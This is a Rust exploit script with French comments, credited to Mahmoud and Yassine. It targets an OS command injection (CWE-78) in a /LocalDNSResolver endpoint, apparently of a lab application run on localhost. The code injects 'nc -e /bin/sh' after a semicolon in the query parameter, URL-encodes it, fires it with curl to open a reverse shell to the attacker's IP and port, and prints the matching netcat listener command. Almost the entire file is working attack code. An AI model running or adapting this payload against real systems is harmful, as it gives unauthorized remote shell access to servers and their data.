// Script d'exploitation automatisée de l'injection de commandes (Reverse Shell)
// Auteurs: Mahmoud et Yassine
// Description: Exploite la vulnérabilité Command Injection dans l'endpoint /LocalDNSResolver pour établir un reverse shell.

use std::env;
use std::process;
use std::io::{self, Write};

fn print_banner() {
    println!("╔═══════════════════════════════════════════════════════════╗");
    println!("║   Exploit Command Injection (Reverse Shell)              ║");
    println!("║   Auteurs: Mahmoud et Yassine                             ║");
    println!("╚═══════════════════════════════════════════════════════════╝");
    println!();
}

fn print_usage() {
    println!("Usage: ./command_injection_reverse_shell <target_url> <local_ip> <local_port>");
    println!("Exemple: ./command_injection_reverse_shell https://localhost:3000 192.168.1.10 4444");
    println!();
}

fn url_encode(input: &str) -> String {
    let mut encoded = String::new();
    for byte in input.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                encoded.push(byte as char);
            }
            _ => {
                encoded.push_str(&format!("%{:02X}", byte));
            }
        }
    }
    encoded
}

fn execute_reverse_shell_injection(target_url: &str, local_ip: &str, local_port: &str) {
    println!("[*] Tentative d'établissement d'un Reverse Shell");
    println!("[*] Endpoint cible: GET {}/LocalDNSResolver", target_url);
    println!("[*] IP d'écoute (votre machine): {}", local_ip);
    println!("[*] Port d'écoute (votre machine): {}", local_port);
    println!();

    // Commande de reverse shell pour Linux (netcat)
    // Attention: la commande doit être en une seule ligne et encodée
    let reverse_shell_cmd = format!("nc -e /bin/sh {} {}", local_ip, local_port);
    
    // Payload final à injecter
    // On utilise le séparateur de commande ';' après un FQDN valide (test.com)
    let payload = format!("test.com;{}", reverse_shell_cmd);
    
    println!("  [+] Commande de Reverse Shell: {}", reverse_shell_cmd);
    println!("  [+] Payload complet injecté: {}", payload);
    
    let encoded_payload = url_encode(&payload);
    let full_url = format!("{}/LocalDNSResolver?i={}", target_url, encoded_payload);
    
    println!("  [+] URL d'attaque: {}", full_url);
    println!();
    println!("  [!] Assurez-vous d'avoir un listener Netcat démarré sur votre machine:");
    println!("      nc -lvnp {}", local_port);
    println!();

    // Exécution de la requête
    let output = process::Command::new("curl")
        .arg("-k")
        .arg("-s")
        .arg("-X")
        .arg("GET")
        .arg(&full_url)
        .output();

    match output {
        Ok(_) => {
            println!("  [✓] Requête d'injection envoyée.");
            println!("      Vérifiez votre listener Netcat pour la connexion.");
        }
        Err(e) => {
            println!("  [✗] Erreur d'exécution de curl: {}", e);
        }
    }
    println!();
}

fn main() {
    print_banner();

    let args: Vec<String> = env::args().collect();

    if args.len() != 4 {
        print_usage();
        process::exit(1);
    }

    let target_url = &args[1];
    let local_ip = &args[2];
    let local_port = &args[3];
    
    println!("[*] URL cible: {}", target_url);
    
    // Le test de connectivité est omis pour ne pas compliquer le script
    // L'utilisateur doit s'assurer que l'application est démarrée.

    execute_reverse_shell_injection(target_url, local_ip, local_port);

    println!("[*] Exploitation terminée!");
    println!();
    println!("╔═══════════════════════════════════════════════════════════╗");
    println!("║   Résumé de la vulnérabilité exploitée:                  ║");
    println!("║   Type: OS Command Injection (Reverse Shell)              ║");
    println!("║   Localisation: Controller/Controller.cs ligne 158        ║");
    println!("║   CWE-78: OS Command Injection                            ║");
    println!("╚═══════════════════════════════════════════════════════════╝");
}
